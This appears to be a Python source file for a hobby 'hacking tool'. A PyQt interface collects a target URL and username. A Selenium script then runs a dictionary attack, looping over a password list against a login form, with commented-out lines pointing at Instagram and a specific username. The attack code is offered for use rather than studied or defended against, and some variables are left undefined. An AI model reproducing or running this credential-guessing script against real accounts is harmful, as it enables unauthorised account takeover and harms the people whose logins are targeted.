######################################################################################################################################################################################################################################################
#########################################################################################################################################################################################################################################################
#
#                                                                        ***        PYQT INTERFACE      ***
#
################################################################################################################################################################################################################################################################
#########################################################################################################################################################################################################################################################

import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt
# To display different colors in single line
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout,QTextBrowser

# To retrieve System details
import socket 


# To run The Password_generator.py file
import subprocess

# STORAFE VARIABLES & CONSTANT TEXTS
main_details = []

constant_text = "[Reaction@localhost]$"

class HackingToolGUI(QWidget):
    def __init__(self):
        super().__init__()
        
        # Set window properties
        self.setWindowTitle("Reaction Coders")
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet("background-color: black;")  # Black background

        # Create layout
        layout = QVBoxLayout()

        # Logo text
        logo_label = QLabel("--------------------------------------------------------------------\n██████╗ ███████╗ █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗\n██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║\n██████╔╝█████╗  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║\n██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║\n██║  ██║███████╗██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║\n╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝\n--------------------------------------------------------------------\n--------------------------------------------------------------------")
        logo_label.setFont(QFont("Courier", 14, QFont.Bold))
        logo_label.setStyleSheet("color: white;")
        logo_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(logo_label)
        
        
        
        
        #details 
        host_ip = socket.gethostbyname(socket.gethostname())
        host_name = socket.gethostname()
        
        
        details_label = QLabel(f"___________________________________________________________________________________________________________________________________\n               $ System Scanning....                                 |                $ Tool Info $\n                                                                     |            \n[Reaction@localhost]$ Fetched Data :                                 |\n                                                                     |        -> UserName Password Cracker\n                   >> Devide IP :{host_ip}                       |        -> Password Generator\n                   >> Device Name :{host_name}                            |        -> Process\n_____________________________________________________________________|______________________________________________________________")
        details_label.setFont(QFont("courier",8,QFont.Bold))
        details_label.setStyleSheet("color : white;")
        details_label.setAlignment(Qt.AlignLeft)
        layout.addWidget(details_label)


        # Target URL label and input
        self.target_url_label = QLabel(f"{constant_text}  Enter TARGET URL:")
        self.target_url_label.setFont(QFont("Courier", 10))
        self.target_url_label.setStyleSheet("color: green;")
        self.target_url_label.setAlignment(Qt.AlignLeft)
        layout.addWidget(self.target_url_label)
        self.target_url_label.setVisible(False)

        self.target_url_input = QLineEdit()
        self.target_url_input.setFont(QFont("Courier", 10))
        self.target_url_input.setStyleSheet("color: blue; background-color: black;")
        layout.addWidget(self.target_url_input)
        self.target_url_input.setVisible(False)

        # Target username label and input
        self.target_username_label = QLabel(f"{constant_text}  Enter TARGET USERNAME:")
        self.target_username_label.setFont(QFont("Courier", 10))
        self.target_username_label.setStyleSheet("color: green;")
        self.target_username_label.setAlignment(Qt.AlignLeft)
        layout.addWidget(self.target_username_label)
        self.target_username_label.setVisible(False)

        self.target_username_input = QLineEdit()
        self.target_username_input.setFont(QFont("Courier", 10))
        self.target_username_input.setStyleSheet("color: blue; background-color: black;")
        layout.addWidget(self.target_username_input)
        self.target_username_input.setVisible(False)

        # Submit button to store the inputs
        self.submit_button = QPushButton("Submit")
        self.submit_button.setFont(QFont("Courier", 10))
        self.submit_button.setStyleSheet("color: white; background-color: red;")
        self.submit_button.clicked.connect(lambda:(self.store_inputs(),self.check_internet_connection(),self.hide_input_and_label(),self.display_command_label_input()))
        layout.addWidget(self.submit_button)
        self.submit_button.setVisible(False)
        #Directing To "INTERNET CONNCETION CHECKING" after clicking "SUBMIT" button
       
        
        # Label & Input FOR COMMAND
        self.target_command_label = QLabel(f"{constant_text}  << START >>")
        self.target_command_label.setFont(QFont("Courier", 10))
        self.target_command_label.setAlignment(Qt.AlignLeft)
        self.target_command_label.setStyleSheet("color : green; background-color : black;")
        layout.addWidget(self.target_command_label)
        self.target_command_label.setVisible(True)
        
        self.target_command_input = QLineEdit()
        self.target_command_input.setFont(QFont("Courier", 10))
        self.target_command_input.setStyleSheet("color : blue; background-color : black;")
        layout.addWidget(self.target_command_input)
        self.target_command_input.setVisible(True)
        
        # SUBMIT BUTTON FOR SUBMTIING THE COMMAD
        self.command_submit_button = QPushButton("Submit")
        self.command_submit_button.setFont(QFont("Courier", 10))
        self.command_submit_button.setStyleSheet("color: white; background-color: red;")
        self.command_submit_button.clicked.connect(lambda:(self.process_command(),self.display_command_label_input()))
        layout.addWidget(self.command_submit_button)
        self.command_submit_button.setVisible(True)
        #Directing To "INTERNET CONNCETION CHECKING" after clicking "SUBMIT" button
       
        
        
  



        # creating Labels for displaying "INTERNET STATUS"
        self.status_label = QLabel("",self)
        self.status_label.setFont(QFont("Bold",5))
        self.status_label.setStyleSheet("color : red; background-color:black")
        self.status_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.status_label)
        
        
        
        self.msg_display_label = QLabel("",self)
        self.msg_display_label.setFont(QFont("italic",8))
        self.msg_display_label.setStyleSheet("color : yellow; background-color : black")
        self.msg_display_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.msg_display_label)
          
           # USER INPUTS
       


        # Set layout
        self.setLayout(layout)
        
        
    def store_inputs(self):
        # Get user input from the fields
        url = self.target_url_input.text()  # Store Target URL
        username = self.target_username_input.text()  # Store Target Username
        main_details.append(url)
        main_details.append(username)
        
        user_command = self.target_command_input.text()
        
        # Print them (or use them in further logic)
        print(f"Target URL: {url}")
        print(f"Target Username: {username}")
        

        
    def hide_input_and_label(self):
        self.target_url_label.setVisible(False)
        self.target_url_input.setVisible(False)
        self.target_username_label.setVisible(False)
        self.target_username_input.setVisible(False)
        self.submit_button.setVisible(False)
        
        
        
        
    # Function To Display Command Label and Input Field
    def display_command_label_input(self):
        self.target_username_label.setVisible(True)
        self.target_username_input.setVisible(True)
        self.target_url_input.setVisible(True)
        self.target_url_label.setVisible(True)
        self.submit_button.setVisible(True)
    
    
    def process_command(self):
        user_command = self.target_command_input.text()
                # Check if the user input matches the command to run the generator script
        if user_command == "<<pass-generator>>":
            # Run the password generator script using subprocess
            subprocess.run(["python", "pass_seperation.py"])
            print(f"{constant_text} Script Running.....")
        else:
          #  self.command_result_label.setText("Invalid command entered.")
           print(f"{constant_text}invalid command")
        # Optionally, clear the input field after submission
        self.target_command_input.clear()
    
        
        
    def check_internet_connection(self):
         try:
             socket.create_connection(("8.8.8.8",53),timeout=5)
             self.status_label.setText("Internet is conneted")
             print("YES CONNECTED")
         except OSError:
             self.status_label.setText("⠀⠀⠀⠀    ⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀\n⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀ ⠀ ⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀\n⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀\n⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷\n⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿\n⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁\n⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀\n⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇\n⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉\n⠀⠀⠀⠀⠉⠉ ⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁\n⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇\n⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏")
             # MSG DISPLAY -->>CONNECT TO WIFI
             self.msg_display_label.setText("  CONNECT INTERNET")
             
             
             
             
             print("NOT CONNECTED")
             
             
        

       
        # You can now use the `url` and `username` variables for further logic
        

app = QApplication(sys.argv)
window = HackingToolGUI()
window.show()
sys.exit(app.exec_())
###################################################################################################################################################################################################################################################################################################

################################################################################################################################################################################################################################################################
###########################################################################################################################################################################################################################################################################
#
#                                                                   ***     SELENIUM -AUTOMATION    ***
#
####################################################################################################################################################################################################################

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time

from selenium.webdriver.common.by import By  # Import the By class
from selenium.webdriver.common.keys import Keys
import time
# Correct path to Brave browser executable
brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"

# Correct path to ChromeDriver (make sure to adjust this path)
chrome_driver_path =  r"C:\Users\hardi\Downloads\CS(EH)\setups $$\chromedriver-win64\chromedriver-win64\chromedriver.exe"

# Set up Chrome options to use Brave
chrome_options = Options()
chrome_options.binary_location = brave_path

# Initialize the ChromeDriver with Brave settings
service = Service(executable_path=chrome_driver_path)
driver = webdriver.Chrome(service=service, options=chrome_options)



# MAIN SELENIUM


# Set up your Instagram username and path to ChromeDriver
#         username = "__hardik_08_"


# Instagram login URL
#         instagram_url = "https://www.instagram.com/accounts/login/"

# Load the list of passwords from the text file
with open('MAIN PASSWORDS LISTS OR DICTIONERY.txt', 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

# Open the Instagram login page
driver.get(url)
time.sleep(3)  # Wait for the page to load

# Enter the username once
username_input = driver.find_element(By.NAME, "username")
username_input.clear()  # Clear any previous text in the username field

username_input.send_keys(username)

# Loop through each password and attempt login
for password in passwords:
    try:
        
        # Find the password field, clear it, and enter the current password
        password_input = driver.find_element(By.NAME, "password")
        password_input.clear() # Clear previous password
        password_input.clear()
        password_input.clear()
        password_input.send_keys(password)  # Enter the current password
        password_input.send_keys(Keys.RETURN)  # Press Enter to submit the form

        # Wait for the login process to complete
        time.sleep(5)  # Adjust sleep time based on internet speed and response time

        # Check if login was successful by seeing if a specific element is present (like profile icon)
        # Here we check if the URL has changed from the login page URL
        if driver.current_url != url:
            print(f"{constant_text}Correct password found: {password}")
            
            break
        else:
            print(f"{constant_text}Incorrect password: {password}")
            
            driver.refresh()
            time.sleep(2)  # Wait for the page to refresh and load again
            # Re-enter the username after the refresh
            username_input = driver.find_element(By.NAME, "username")
            username_input.clear()
            username_input.send_keys(username)

    except Exception as e:
        print(f"An error occurred: {e}")
        continue

# Close the browser after finishing
driver.quit()


############################################################################################
#       PYQT lats package exit
############################################################################################

